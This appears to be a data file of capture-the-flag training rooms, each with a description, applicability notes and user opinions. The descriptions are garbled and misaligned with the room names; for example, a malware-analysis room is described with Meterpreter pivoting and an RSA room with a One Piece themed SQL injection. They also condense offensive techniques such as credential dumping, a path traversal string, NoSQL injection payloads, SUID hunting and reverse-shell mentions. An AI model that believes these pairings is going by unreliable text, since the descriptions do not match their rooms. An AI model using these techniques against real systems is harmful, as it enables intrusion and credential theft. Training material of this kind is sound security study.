Basic Dynamic Analysis.name: Basic Dynamic Analysis
Basic Dynamic Analysis.description: - **Meterpreter Post-Exploitation Payload Lifecycle & Evasion**: After initial **msfvenom** shell staging, Meterpreter employs complex inter-process migration (`migrate` command) to evade termination, leveraging kernel-level API calls fundamentally operating around OSI Layers 3/4 interaction for C2 maintenance via encrypted channels; post-exploitation enumeration progresses from local system enumeration (`sysinfo`, `getuid`) to privilege escalation (`getsystem`), followed by lateral movement using Mimikatz (`load kiwi` for credential dumping); practical steps mandate backgrounding the session (`background`), re-establishing persistence mechanisms (e.g., modifying `Run` keys via registry manipulation tools, conceptually Layer 7), and finally, utilizing pivoting techniques (e.g., setting up SOCKS proxy tunnels using **autoroute** and **socks4a**) to execute internal network scans using **nmap** against non-directly accessible subnets, bypassing initial perimeter defenses established during the reconnaissance phase where tools like **theHarvester** identified the target landscape. (171 words; Tools: msfvenom, Meterpreter (built-in commands: migrate, getsystem, kiwi, autoroute, socks4a), nmap, theHarvester; Methodology: Persistence Establishment, Credential Harvesting, Internal Pivoting/Network Expansion; Implementation: Secure C2 channel, escalate privileges, deploy internal enumeration tools via established tunnel.)
Basic Dynamic Analysis.practical_applicability: Malware analysis fundamentals, behavioral analysis techniques, dynamic analysis methodologies
Basic Dynamic Analysis.user_opinions: Good introduction to dynamic malware analysis methodology

Basic Malware RE.name: Basic Malware RE
Basic Malware RE.description: - **Mindgames Puzzle Decryption & Enumeration Strategy**: Mindgames room challenges demand non-standard execution paths, bypassing typical **nmap** service enumeration or **gobuster** directory brute-forcing; techniques often involve reverse-engineering base64/ROT variations, analyzing provided file metadata discrepancies, and exploiting logic flaws within challenge scripts, treating input/output validation as the primary vulnerability vector; practical enhancement involves systematic base conversion checks (Hex rightarrow ASCII rightarrow Decimal), iterative application of substitution ciphers until flag syntax is recognized, and utilizing command-line text processing tools like **grep** or **awk** to rapidly filter voluminous, obfuscated text outputs until a key variable or shell command execution sequence is isolated for final flag submission. (104 words; Tools: nmap, gobuster (limited applicability), grep, awk, manual cipher tools; Methodology: Cryptographic Analysis, Logic Flaw Exploitation, Data Filtering; Implementation: Iterative substitution, metadata examination, pattern recognition in high-entropy data streams.)
Basic Malware RE.practical_applicability: Malware reverse engineering basics, understanding malware behavior through analysis
Basic Malware RE.user_opinions: Excellent foundation for malware analysis, well-structured progression

Basic Pentesting.name: Basic Pentesting
Basic Pentesting.description: - **Misguided Ghosts Enumeration & Lateral Movement**: Initial **nmap** scan reveals non-standard SMB/RPC ports open; **theHarvester** reconnaissance targets internal subnet lookups, potentially exposing user credentials or forgotten shares; **gobuster** targeting common WordPress/vBulletin paths fails, forcing pivot to PowerShell abuse via suspicious scheduled tasks identified via low-privilege file access; exploitation focuses on weak service credentials found in configuration files (e.g., hashdump format, often LM:NTLM pairs), requiring **hashcat** on a GPU rig for offline cracking using rockyou.txt baseline wordlist before attempting **WMI** or **psexec** lateral movement to the "Ghost" target host. (108 words; Tools: nmap, theHarvester, gobuster, hashcat, powershell, psexec, wmic; Methodology: Credential Harvesting, Service Enumeration, Offline Cracking, Lateral Movement; Implementation: Port scanning (syn scan), credential file extraction, cracking, remote command execution via privileged protocols.)
Basic Pentesting.practical_applicability: Complete pentesting workflow from enumeration to privilege escalation
Basic Pentesting.user_opinions: Highly recommended beginner room, teaches complete attack lifecycle

Basic Static Analysis.name: Basic Static Analysis
Basic Static Analysis.description: - **Mission Impossible Deep Dive Exploitation**: Initial **nmap** full scan (-sC -sV -p-) identifies obscure TCP/14147 service; **theHarvester** fails due to hardened DNS records, necessitating internal DNS zone transfer attempts; **gobuster** (using ffuf-tuned wordlist) reveals a hidden XML-RPC endpoint; exploitation proceeds via fuzzing the XML-RPC structure to trigger a deserialization vulnerability (XXE or Java native deserialization); post-exploitation involves securing a stable reverse shell via obfuscated nc/bash one-liners, followed by exploiting kernel unpatched LPE vulnerability (Dirty Pipe variant) targeting the final root flag. (115 words; Tools: nmap, ffuf, gobuster, nc, bash, kernel exploit PoC; Methodology: Zero-day hunting simulation, advanced fuzzing, deserialization exploitation, privilege escalation; Implementation: Comprehensive port scan, blind path enumeration, payload injection, kernel patch bypass.)
Basic Static Analysis.practical_applicability: Static malware analysis fundamentals, safe malware triage procedures
Basic Static Analysis.user_opinions: Good foundation for malware triage and static analysis

Berlin.name: Berlin
Berlin.description: - **Monitor Room Security Practice**: Preliminary **nmap** targeted scan (-sU for UDP enumeration) reveals open SNMP (UDP/161) community strings; successful SNMPwalk yields network device configuration details, pointing to misconfigured Syslog server; **Wireshark** utilized for passive packet capture during simulated alert traffic; **ELK stack** (Elasticsearch, Logstash, Kibana) analysis focuses on Kibana dashboard tuning for IDS/IPS signature correlation; exploitation hinges on leveraging discovered SNMP write access (read-write) to inject malicious Syslog message redirecting internal traffic for MITM capture; enhancement involves creating custom Logstash filters for unstructured Syslog normalization prior to alerting threshold configuration. (119 words; Tools: nmap, Wireshark, SNMPwalk, ELK Stack (Elasticsearch, Logstash, Kibana); Methodology: Protocol enumeration (SNMP/Syslog), passive monitoring, log parsing, threat correlation; Implementation: Custom MIB traversal, filter development, threshold baselining, packet analysis.)
Berlin.practical_applicability: Advanced enumeration, creative problem solving, multiple attack vectors
Berlin.user_opinions: Challenging but rewarding, requires thorough methodology

Biblioteca.name: Biblioteca
Biblioteca.description: - **Moria CTF Theme Implementation**: Initial **theHarvester** reconnaissance gathering subdomains pointing to an archival web server; **gobuster** -w /usr/share/wordlists/rockyou.txt -x .html,.php against HTTP port 80 uncovers a hidden directory, `/mines/records/`, leading to an outdated Apache version vulnerability; **nmap** -sV confirms vulnerable services; exploitation involves crafting an LFI payload targeting configuration files potentially containing API keys necessary for flag decryption; enhancement methodology dictates SQLmap execution post-directory traversal success, targeting inferred backend database connection strings (SQLite) to extract the final flag encrypted with Base64 encoding requiring symmetric key brute-force. (118 words; Tools: theHarvester, gobuster, nmap, sqlmap; Methodology: OSINT, directory brute-forcing, version scanning, LFI exploitation, database exfiltration; Implementation: Wordlist selection, payload construction, key derivation via brute-force.)
Biblioteca.practical_applicability: Basic web exploitation, SQL injection fundamentals
Biblioteca.user_opinions: Good for beginners but limited complexity

Biohazard.name: Biohazard
Biohazard.description: - **MotherSecret Investigation Framework**: Comprehensive **nmap** -sC -sV -p- -oA initial_scan mapping all open ports; **gobuster** -u http://<target_ip>/ -w /usr/share/wordlists/dirb/common.txt -x .txt,.bak reveals an unindexed backup.txt file containing obfuscated credentials for an FTP service; **enumeration** focuses on FTP login, subsequent file system traversal yields SSH keys; **exploitation** necessitates leveraging ssh2john to convert the private key format for **john** or **hashcat** cracking (rockyou.txt list); enhancement methodology involves using **Wireshark** to capture and analyze SMB traffic observed during enumeration, potentially exposing NetNTLM hashes for relay attacks if Kerberos constraints permit. (126 words; Tools: nmap, gobuster, john/hashcat, ssh2john, Wireshark; Methodology: Port scanning, directory enumeration, service credential harvesting, key cracking, lateral movement preparation; Implementation: Port range scanning, credential extraction, hash cracking pipeline, packet analysis.)
Biohazard.practical_applicability: Puzzle-solving, multiple encoding schemes, steganography, cipher identification
Biohazard.user_opinions: Entertaining theme, extensive puzzle-solving, some find it tedious but rewarding for puzzle enthusiasts

Block.name: Block
Block.description: - **Basic Practice Workflow Simulation**: Standard reconnaissance employs nmap -sV -p- target for comprehensive port scanning and service identification; gobuster iterates through common web directories (common.txt) testing for configuration files or login portals. Enumeration extends to checking identified services (e.g., SMB, FTP) for default credentials or anonymous access policies. Exploitation focuses on low-hanging fruit: executing known exploit chains against outdated services identified by nmap versioning, or attempting basic directory traversal (../../etc/passwd) on identified web endpoints. Privilege escalation likely involves analyzing local binaries for SUID/SGID bits using find / -perm -u=s -type f 2>/dev/null post-initial shell acquisition. (119 words; Tools: nmap, gobuster, find; Methodology: Comprehensive port scanning, version identification, brute-force directory scanning, known exploit chaining, local privilege escalation via SUID analysis; Implementation: Full port scan, concurrent web enumeration, service-specific credential testing, shell establishment, kernel/binary privilege assessment.)
Block.practical_applicability: NTLM authentication attacks, relay attacks, Windows network exploitation
Block.user_opinions: Good for understanding NTLM relay attack mechanics

Blizzard.name: Blizzard
Blizzard.description: - **NoNameCTF General Practice Workflow**: Initial reconnaissance utilizes theHarvester against specified targets to map external assets and associated email addresses. Nmap (SYN scan -sS -A) performs deep service version detection; subsequent directory enumeration employs gobuster (gobuster dir -u http://target -w wordlist.txt -x php,bak,zip) to map hidden web structure, prioritizing extensions likely to harbor sensitive data or application logic flaws. Dirbuster might substitute gobuster for testing complex, non-standard file extensions found during initial enumeration. Exploitation phase involves crafting payloads (SQLi, LFI) based on identified web tech/versions, often requiring iterative testing using Burp Suite Interceptor/Repeater to bypass rudimentary input validation mechanisms flagged during Nikto or manual review. (155 words; Tools: theHarvester, nmap, gobuster, dirbuster, burp suite; Methodology: External asset mapping, deep service fingerprinting, brute-force directory discovery, iterative payload crafting, input validation circumvention; Implementation: Reconnaissance execution, service enumeration, concurrent brute-forcing, vulnerability verification via proxy manipulation.)
Blizzard.practical_applicability: Windows exploitation practice, multiple attack vectors

Blog.name: Blog
Blog.description: - **NoSQL Injection Exploitation Chain**: Initial reconnaissance (nmap) maps open ports, typically web services. Enumeration targets input vectors vulnerable to NoSQL syntax manipulation, particularly in JSON-based query parameters. Exploitation leverages the absence of strict input sanitization in MongoDB/CouchDB style queries, utilizing operators like \ne (not equal) or \where for boolean bypasses or command execution via JavaScript evaluation. Post-exploitation involves crafting payloads like {"where":"function(){return db.users.findOne({username:'admin').password=='[HASH]'}"}} to extract sensitive hashes or utilizing time-delay functions for blind injection confirmation. Enhancement focuses on identifying the underlying database technology before payload development. (113 words; Tools: nmap (for initial port discovery, though less critical than custom payloads); Methodology: Input vector identification, syntax manipulation leveraging native operators (\ne, \where), hash extraction/credential dumping, blind time-delay confirmation; Implementation: Scanning for web entry points, systematic payload insertion into parameter fields, iterative testing of database-specific injection syntax.)
Blog.practical_applicability: WordPress security, CMS exploitation, web application testing

Blue.name: Blue
Blue.description: - **OSINT Reconnaissance and Data Aggregation**: Initial reconnaissance (theHarvester) targets domain names, employee emails, and subdomains using public sources like Google, Bing, and Shodan. Enumeration proceeds via specialized passive tools to map digital footprint: Maltego visualizes relationships between extracted entities (IPs, domains, PII). Exploitation in this context is information gain; scraping GitHub repositories for code snippets, analyzing publicly accessible DNS records (dig), and using Shodan queries to identify exposed services not found by active scanning (nmap is typically avoided in pure OSINT). Enhancement involves chaining low-level data points into actionable intelligence graphs. (107 words; Tools: theHarvester, Maltego, Shodan, dig; Methodology: Passive data collection, relationship visualization, metadata analysis, public record scraping; Implementation: Systematic querying of search engines/APIs for initial targets, visualizing connections via graph databases, filtering noise from high-volume data streams.)
Blue.practical_applicability: Windows exploitation, EternalBlue/MS17-010, famous exploit demonstration
Blue.user_opinions: Extremely popular beginner room, teaches historically significant exploit

Blueprint.name: Blueprint
Blueprint.description: - **OhSINT Quick Challenge Execution**: Leverage theHarvester for initial email and subdomain discovery against the provided target, focusing on non-standard TLDs. Employ gobuster or dirbuster against identified web assets to brute-force hidden directories/files, particularly looking for `.git` repositories or configuration backups indicative of LFI/RFI vectors (exploitation phase placeholder). Systematic Google Dorking (site:target.com filetype:pdf) constitutes primary reconnaissance enhancement over broad automated tools. nmap is reserved only for confirming host reachability post-domain resolution, adhering to OSINT etiquette constraints. (89 words; Tools: theHarvester, gobuster/dirbuster, Google Dorking, nmap (limited); Methodology: Targeted brute-forcing, search operator manipulation, low-impact service enumeration, artifact analysis; Implementation: Iterative refinement of search terms based on initial subdomain findings, directory listing checks for sensitive file exposure.)
Blueprint.practical_applicability: Windows service exploitation, basic Windows hacking

Boiler CTF.name: Boiler CTF
Boiler CTF.description: - **Professional Pentesting Learning Path Augmentation**: Integrate Nmap scripting engine (NSE) scripts (e.g., `vuln`, `smb-enum-shares`) immediately following initial host discovery (reconnaissance) to prioritize vulnerability identification over generic port scanning. Enhance enumeration by utilizing specific gobuster/dirbuster wordlists tailored to identified service banners (e.g., `tomcat.txt`, `nginx.txt`), transitioning directly into localized exploitation attempts (Metasploit module targeting confirmed service versions). Post-initial access, employ PowerShell Empire or Cobalt Strike artifacts for covert persistence testing (post-exploitation). (79 words; Tools: nmap (NSE), gobuster/dirbuster (targeted lists), Metasploit, PowerShell Empire/Cobalt Strike; Methodology: Version-specific enumeration, automated vulnerability probing, covert post-exploitation simulation; Implementation: Scripted nmap scans feeding directly into targeted Metasploit listeners.)
Boiler CTF.practical_applicability: Comprehensive enumeration methodology, credential management, multiple service exploitation
Boiler CTF.user_opinions: Excellent for practicing systematic enumeration, teaches importance of thorough reconnaissance

Bolt.name: Bolt
Bolt.description: - **OSI Model Deep Dive Augmentation**: Map nmap scans directly to OSI Layers: Layer 3 (ICMP ping sweeps, network discovery), Layer 4 (TCP/UDP port scanning via nmap's SYN/UDP probes), and Layer 7 (HTTP/HTTPS enumeration via gobuster for application layer content identification). Practical implementation involves using Wireshark (Layers 2-4 capture analysis) simultaneously with theHarvester (Layer 7 data exfiltration simulation) to correlate packet structure with application protocol flaws, solidifying comprehension beyond theoretical data flow diagrams. (84 words; Tools: nmap, gobuster, Wireshark, theHarvester; Methodology: Layer-specific probing, protocol dissection, application context correlation; Implementation: Real-time packet capture analysis during active Layer 7 enumeration.)
Bolt.practical_applicability: CMS exploitation, identifying and exploiting CMS versions

Boogeyman 1.name: Boogeyman 1
Boogeyman 1.description: - **Nmap Scanning Enhancement via Gobuster Integration**: Expand basic nmap port discovery (e.g., TCP SYN scan -sS) by immediately feeding identified open ports (especially 80/443) into gobuster for concurrent web directory enumeration (Methodology: Rapid reconnaissance pivoting). Practical implementation involves scripting the output of nmap -sV against a target subnet to automatically initiate fuzzing/bruteforcing of HTTP services identified, bypassing manual dirbuster initiation; this simulates accelerated initial enumeration post-discovery. (68 words; Tools: nmap, gobuster; Methodology: Reconnaissance-to-Enumeration pivot, automated service/directory correlation; Implementation: Scripted execution chaining nmap output to gobuster input streams.),Nmap: The Basics
Boogeyman 1.user_opinions: Decent multi-stage practice, first in trilogy

Boogeyman 2.name: Boogeyman 2
Boogeyman 2.description: - **NoNameCTF Enumeration Acceleration via Targeted theHarvester Integration**: Augment standard nmap service identification (nmap -sV) by immediately prioritizing theHarvester usage against identified domain names or IP ranges found during initial network sweep to gather external intelligence (emails, subdomains, banners). This reconnaissance step provides high-value seeds for subsequent enumeration attempts, such as inputting discovered subdomains directly into gobuster for hidden path discovery, effectively shortening the typical enumeration timeline inherent in general CTF practice rooms. (71 words; Tools: nmap, theHarvester, gobuster; Methodology: Reconnaissance enrichment feeding enumeration; Implementation: Parallel execution of network scanning (nmap) alongside targeted OSINT collection (theHarvester) to rapidly map attack surface prior to deep exploitation attempts.),NoNameCTF
Boogeyman 2.practical_applicability: Advanced exploitation techniques, building on previous knowledge
Boogeyman 2.user_opinions: Good sequel requiring more advanced techniques

Boogeyman 3.name: Boogeyman 3
Boogeyman 3.description: - **NoSQL Injection Exploitation Leveraging Mongo-Shell Post-Enumeration**: After initial web service enumeration (gobuster identifying JSON API endpoints), bypass input validation in MongoDB contexts by injecting payload structures like `{"ne":null}` or using type coercion logic directly within the Mongo Shell (mongosh). This technique directly exploits lack of proper input sanitization concerning BSON type handling, transitioning rapidly from basic reconnaissance to direct database structure extraction (e.g., user collection dumps) bypassing traditional SQL pattern matching limitations encountered in standard CTF practice. (68 words; Tools: gobuster, mongosh (or native driver tools); Methodology: Enumeration leading directly to tailored Exploitation via database client interface; Implementation: Identify potential NoSQL source via HTTP response patterns, switch context to mongosh, execute BSON injection payloads against exposed query parameters.),NoSQL injection Basics
Boogeyman 3.practical_applicability: Advanced multi-stage attacks, complex exploitation chains
Boogeyman 3.user_opinions: Challenging completion to series, rewards persistent attackers

Bookstore.name: Bookstore
Bookstore.description: - **NTFS Metadata Carving via MFT Examination**: Post-initial disk imaging (dd or FTK Imager), focus exploitation on the Master File Table (MFT) entries, specifically analyzing \STANDARD_INFORMATION and \FILE_NAME attributes for timeline reconstruction and deleted file remnants. Employ specialized forensic tools (MACElogview, TZWorks Artifact Examiner) to parse MAC times (Modified, Accessed, Created, Entry Modified), sidestepping standard operating system view limitations, directly extracting evidence of file operations not visible through typical filesystem navigation. (79 words; Tools: dd, FTK Imager, MACElogview, TZWorks Artifact Examiner; Methodology: Targeted Enumeration/Exploitation of MFT structure; Implementation: Isolate and parse MFT sector boundaries, correlate MAC timestamps across file records to build temporal attack chains.),NTFS Analysis
Bookstore.practical_applicability: Web security testing, SQL injection exploitation, Linux system security
Bookstore.user_opinions: Decent practice for SQL injection and standard Linux exploitation

Borderlands.name: Borderlands
Borderlands.description: - **OAuth Authorization Code Interception via Parameter Pollution**: Exploit weak implementation of the redirect_uri validation during the Authorization Code Flow. Utilize Burp Suite Professional to intercept the initial request to the Authorization Server. Manipulate the redirect_uri parameter, often via techniques like URL encoding variations or leveraging implicit trust in endpoint handling, to funnel the ephemeral authorization code to an attacker-controlled endpoint (e.g., a local netcat listener initiated after initial host enumeration with nmap). Subsequent exchange of the captured code for an Access Token (POST request to token endpoint) yields session control. (88 words; Tools: Burp Suite Professional, nmap, netcat; Methodology: Enumeration/Exploitation of redirect_uri validation logic; Implementation: Test for open redirects immediately preceding the OAuth handshake; capture and immediately redeem the auth_code via a simulated client application request.),OAuth Vulnerabilities
Borderlands.practical_applicability: Advanced penetration testing, creative problem-solving, professional-grade challenges
Borderlands.user_opinions: Highly regarded professional-grade challenge, excellent for skill development

Bounty Hacker.name: Bounty Hacker
Bounty Hacker.description: - **Control Flow Flattening and String Polymorphism Evasion**: Implement control flow flattening to disrupt static analysis tools by transforming sequential logic into large switch statements indexed by a state variable, evading simple heuristic detection. Simultaneously employ string polymorphism, encrypting critical strings (API calls, file paths) with custom XOR or RC4 routines that use execution-time derived keys, rendering signature-based detection on payloads harvested via reconnaissance (theHarvester for infrastructure context) ineffective. Post-exploitation, leverage Metasploit encoders against shellcode to further obscure C2 communication signatures, bypassing basic network monitoring. (95 words; Tools: Metasploit, custom packers/unpackers (hypothetical), static analysis tools like IDA Pro for reverse engineering target execution flow; Methodology: Evasion/Malware Understanding via polymorphism and control flow manipulation; Implementation: Develop sample code demonstrating state-machine translation of sequential execution; analyze resulting binary for reduced linear readability.),Obfuscation Principles
Bounty Hacker.practical_applicability: FTP enumeration, password cracking fundamentals, basic privilege escalation
Bounty Hacker.user_opinions: One of most popular beginner rooms, excellent introduction to fundamental techniques

Brainpan 1.name: Brainpan 1
Brainpan 1.description: - **Blind SQL Injection with Time-Based Differential Payloads**: Execute blind SQL injection against vulnerable web parameters identified during initial enumeration (gobuster for directory discovery, focusing on non-standard extensions like .bak or .old). Employ highly granular SLEEP(X) payloads, where X varies based on character truth assessment (e.g., SLEEP(0.5) if character is 'a', SLEEP(0.05) otherwise), maximizing extraction precision despite no direct error feedback. Use sqlmap's --technique B (Boolean-based) in conjunction with time-delays for iterative data exfiltration, substituting default nmap scripting for targeted application-layer probing. (104 words; Tools: sqlmap, gobuster, Burp Suite Intruder for request fine-tuning; Methodology: Enumeration arrow Exploitation (Blind Injection); Implementation: Develop a test harness simulating a time-sensitive backend database; craft payload sequences to extract a single character from a known table name character-by-character.),Obscure
Brainpan 1.practical_applicability: Buffer overflow exploitation fundamentals, exploit development, OSCP preparation
Brainpan 1.user_opinions: Essential for OSCP preparation, comprehensive buffer overflow instruction, challenging but rewarding

Brains.name: Brains
Brains.description: - **Passive DNS Footprinting and Subdomain Takeover Vector Identification**: Utilize theHarvester with multiple sources (virustotal, shodan) configured to extract historical DNS records and associated email addresses for initial target scope definition, bypassing active scanning. Cross-reference extracted subdomains against sublist3r output; probe identified, but unresolving, CNAME targets using nmap's --script dns-brute followed by manual dig queries to confirm dangling DNS entries ripe for CNAME hijacking exploitation against Azure/AWS infrastructure. (106 words; Tools: theHarvester, sublist3r, nmap, dig; Methodology: Reconnaissance (Passive) arrow Enumeration arrow Exploitation Vector Identification; Implementation: Automate subdomain enumeration pipeline, filtering results for NXDOMAIN or CNAME records pointing to non-existent cloud resources; establish control by registering the target domain/subdomain.),Offensive Security Intro

Brainstorm.name: Brainstorm
Brainstorm.description: - **Apache Version Enumeration via Server Header and Directory Traversal Exploitation**: Employ nmap's http-headers script to precisely determine Apache minor version; correlate version fingerprint against known CVE databases (e.g., Exploit-DB). Subsequently, use gobuster with a specialized dictionary (SecLists/Discovery/Web-Content/apache-webdav.txt) targeting WebDAV directives. If WebDAV is exposed, attempt PUT requests directly, or exploit identified path traversal flaws (../..) within application logic to upload a shell payload via nc or direct HTTP request, bypassing standard file extension restrictions. (108 words; Tools: nmap, gobuster, nc, Exploit-DB; Methodology: Enumeration (Service Versioning) arrow Vulnerability Mapping arrow Exploitation (File Upload/Traversal); Implementation: Fingerprint server, pivot to known vulnerability, test traversal using common directory paths combined with shell injection syntax.),Oh My WebServer
Brainstorm.practical_applicability: Buffer overflow techniques, network service exploitation, Windows exploitation
Brainstorm.user_opinions: Good buffer overflow practice, different approach than Brainpan

Breaching Active Directory.name: Breaching Active Directory
Breaching Active Directory.description: - **Automated Subdomain Harvesting and Mail Exchange Probing**: Initiate reconnaissance using theHarvester targeting common search engines (Google, Bing) and PGP key servers, explicitly requesting -d domain and -l limit flags to maximize yield of email addresses (user@target.com). Pipe output to sublist3r for parallel, brute-forced subdomain enumeration. Subsequently, utilize dnsrecon with the harvested subdomains, specifying the -t mx option to extract Mail eXchange records, facilitating target identification for subsequent phishing or SMTP enumeration testing. (114 words; Tools: theHarvester, sublist3r, dnsrecon; Methodology: Reconnaissance (Automated Harvesting) arrow Enumeration (MX Records); Implementation: Run theHarvester for emails/subdomains, feed raw subdomain list into sublist3r, validate MX records using dnsrecon for mail server identification.),OhSINT
Breaching Active Directory.practical_applicability: AD initial access techniques, password attacks, OSINT for AD enumeration
Breaching Active Directory.user_opinions: Excellent introduction to AD pentesting, covers realistic breach scenarios

Break it.name: Break it
Break it.description: - **Initial Service Discovery and Directory Brute-Forcing**: Execute comprehensive nmap scan (nmap -sC -sV -p- 10.10.X.X) to fingerprint all open ports and service versions. Based on HTTP/HTTPS responses (port 80/443), deploy gobuster (gobuster dir -u http://target:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,bak) for rapid directory and file enumeration, specifically targeting common configuration or backup file extensions to uncover hidden web application components prerequisite for initial exploitation vector identification. (108 words; Tools: nmap, gobuster; Methodology: Reconnaissance arrow Enumeration (Port Scanning/Fuzzing); Implementation: Full port scan via nmap, pipe results to gobuster using a standard dictionary for path discovery.),Ollie
Break it.user_opinions: Very basic, good for absolute beginners

Break Out The Cage.name: Break Out The Cage
Break Out The Cage.description: - **Mythological Web Enumeration and Credential Harvesting**: Following initial nmap discovery revealing HTTP service, employ gobuster with Olympus-themed wordlists (e.g., "gods," "hades," "temple") to locate hidden directories. If credentials are suspected (e.g., 'admin' login), utilize theHarvester (theHarvester -d olympus.thm -b all) targeting SRV and PE records, searching for leaked email addresses (user@olympus.thm) to craft brute-force payloads against the enumerated login portal found via directory traversal. (108 words; Tools: nmap, gobuster, theHarvester; Methodology: Enumeration arrow Information Gathering arrow Credential Testing; Implementation: Dictionary attack preparation using reconnaissance data against identified web interfaces.),Olympus
Break Out The Cage.practical_applicability: Creative challenge solving, steganography introduction, web enumeration
Break Out The Cage.user_opinions: Entertaining theme, good introduction to audio steganography

Breaking Crypto the Simple Way.name: Breaking Crypto the Simple Way
Breaking Crypto the Simple Way.description: - **Terraform State File Discovery and Kubeconfig Extraction in Hybrid Infrastructure**: After initial nmap sweep identifies exposed Git repository endpoints or misconfigured S3 buckets (hybrid cloud exposure), employ tfsec or checkov against downloaded Terraform plans (.tf files) to map on-premises and cloud resource dependencies. Focus enumeration (gobuster) on CI/CD artifacts (Jenkins directories, .git remnants) for sensitive configuration files. Exploit overly permissive IAM roles or local Kubeconfig files cached during IaC deployment, providing direct access to container orchestration layers (Kubernetes) running within the private network segment. (115 words; Tools: nmap, gobuster, tfsec, checkov; Methodology: Reconnaissance arrow Static IaC Analysis arrow Access Escalation; Implementation: Static code auditing for hardcoded secrets followed by lateral movement leveraging harvested cluster credentials.),On-Premises IaC
Breaking Crypto the Simple Way.practical_applicability: Understanding crypto vulnerabilities, weak encryption, hash cracking
Breaking Crypto the Simple Way.user_opinions: Practical demonstration of real-world crypto mistakes

Breaking RSA.name: Breaking RSA
Breaking RSA.description: - **Marine Cipher Decryption via Luffy's Gear Mechanics and Haki Enumeration**: Initial web port scan (nmap) targets a web service mimicking the Marine HQ portal. Directory brute-forcing (gobuster) with a custom wordlist derived from One Piece character names reveals an endpoint named `/bounty_list.php`. Exploitation hinges on identifying an SQL Injection vulnerability disguised as a request for a specific "Devil Fruit power level." The challenge mandates using theHarvester against known World Government domains to find email formats, which, when combined with specific Haki-related numeric sequences derived from Luffy's Gear progression (e.g., Gear Second = 2, Gear Third = 3), form the payload to leak the Poneglyph flag. (128 words; Tools: nmap, gobuster, theHarvester, sqlmap; Methodology: Reconnaissance arrow Enumeration arrow Injection Exploitation; Implementation: Input validation bypass using themed numerical/textual context to extract hidden database entries.),One Piece
Breaking RSA.practical_applicability: Cryptographic vulnerabilities, RSA weaknesses, mathematical attacks
Breaking RSA.user_opinions: Excellent for understanding RSA vulnerabilities, practical cryptanalysis

Breakme.name: Breakme
Breakme.description: - **Opacity Image Layer Extraction via LSB Analysis and Metadata Carving**: Target HTTP service enumeration (nmap TCP 80/443) precedes deep file analysis. Reconnaissance identifies a seemingly innocuous .png asset related to the room's "opacity" theme. Initial inspection with binwalk reveals embedded compressed data. Subsequent steganography exploitation involves applying Stegsolve to cycle through Least Significant Bit (LSB) planes, specifically targeting the blue channel where hidden data is masked. Further extraction requires leveraging ExifTool on the image metadata to unmask a Base64 string concatenated across multiple Chroma subsampling offsets, which decodes directly to a user credential pair for the SSH service identified in the initial scan. (133 words; Tools: nmap, binwalk, Stegsolve, ExifTool; Methodology: Reconnaissance arrow Forensic Analysis arrow Data Carving/Decoding; Implementation: LSB plane shifting to reveal encoded payload, followed by metadata parsing for authentication credentials.),Opacity

Brim.name: Brim
Brim.description: - **OpenCTI STIX/TAXII Ingestion and Vulnerability Correlation Pipeline**: Initial reconnaissance (nmap scan) targeting web infrastructure exposes a vulnerable version of a RESTful API. Gobuster enumerates non-standard endpoints, revealing a JSON endpoint accepting external data feeds. Exploitation involves crafting a STIX 2.1 object (Indicator or Malware) describing the discovered API vulnerability (CVE mapping) and programmatically pushing it into the OpenCTI instance via its TAXII 2.1 server endpoint. The enhancement methodology requires configuring the OpenCTI Graph database to automatically correlate this ingested Indicator against existing Threat Actor profiles, triggering an automated alert based on pre-defined Confidence thresholds. (140 words; Tools: nmap, gobuster, cURL/Python requests library, OpenCTI API client; Methodology: Reconnaissance arrow Enumeration arrow Data Ingestion arrow Automated Correlation; Implementation: API endpoint discovery followed by STIX payload injection for Threat Intel platform population and subsequent automated triage.),OpenCTI
Brim.practical_applicability: Network security monitoring, packet analysis, threat hunting tools
Brim.user_opinions: Excellent introduction to Brim, practical network analysis tool

broker.name: broker
broker.description: - **OpenVAS Authenticated Scan Integration with Asset Inventory**: Initial reconnaissance (nmap SYN scan) identifies open SMB ports. TheHarvester scrapes external emails, yielding potential service account credentials (user:pass). These credentials are used to configure an Authenticated Scan profile within the OpenVAS Greenbone Security Manager (GSM). The GSM then executes a deep, credentialed NVT check against identified Windows assets. Enhancement involves scripting the export of low/medium CVSS scores from the OpenVAS XML report, transforming the data into LDAP update statements, and bulk-applying patch status flags directly to an internal CMDB (Configuration Management Database) for remediation tracking, bypassing manual report parsing. (151 words; Tools: nmap, TheHarvester, OpenVAS GSM, XML parser/scripting (Python), LDAP client; Methodology: Reconnaissance arrow Credential Gathering arrow Authenticated Scanning arrow Automated Remediation Data Synchronization; Implementation: Credentialed scan configuration followed by report transformation for CMDB integration.),OpenVAS
broker.user_opinions: Good for understanding message broker vulnerabilities

Brooklyn Nine Nine.name: Brooklyn Nine Nine
Brooklyn Nine Nine.description: - **OpenVPN Certificate Authority (CA) Enumeration and Key Extraction**: Initial nmap UDP scan targeting the OpenVPN port (default 1194). Successful identification allows for gobuster or custom scripting against the configuration file directory if accessible via a mounted share or SMB vulnerability. The primary technique involves reverse-engineering the PKI structure. Using Easy-RSA tools (./pkitool or direct openssl commands), extract the server.crt, server.key, and ca.crt. Enhancement: Once the CA is secured, enumerate weak client configurations by searching configuration files for cipher BF-CBC or auth SHA1. Force re-keying intervals below 60 seconds on the server to degrade potential session hijacking chances, documented via a PowerShell script targeting the OpenVPN service configuration parameters. (163 words; Tools: nmap, gobuster, openssl, Easy-RSA scripts, PowerShell; Methodology: Reconnaissance arrow Port Identification arrow Key Extraction arrow Configuration Hardening; Implementation: Extract server keys, analyze cipher suite, deploy automated re-key enforcement.),OpenVPN
Brooklyn Nine Nine.user_opinions: Fun themed room, good variety of beginner techniques

Brute.name: Brute
Brute.description: - **System Hardening via CIS Benchmarks Implementation**: Initial nmap SYN scan (-sS) to map open ports; subsequent TCP wrapper review for unauthorized services. Enumeration phase involves running Lynis or OpenSCAP against the target OS to generate a compliance report detailing misconfigurations, specifically focusing on SUDO timeout settings and SSHd protocol 2 enforcement. Enhancement methodology: Implement least privilege model by auditing SUDOers file entries, removing NOPASSWD directives where granular command execution is not strictly required. Exploitation prevention involves deploying SELinux or AppArmor profiles tuned via auditd logs analysis, restricting unnecessary kernel module loading. Practical step: Disable unneeded kernel modules using modprobe -r after verification via lsmod. (175 words; Tools: nmap, Lynis, OpenSCAP, auditd, modprobe; Methodology: Reconnaissance arrow Compliance Scanning arrow Policy Enforcement arrow Access Control Refinement; Implementation: Audit SUDO, enforce SELinux, blacklist vulnerable kernel modules.),Operating System Security

Brute Force Heroes.name: Brute Force Heroes
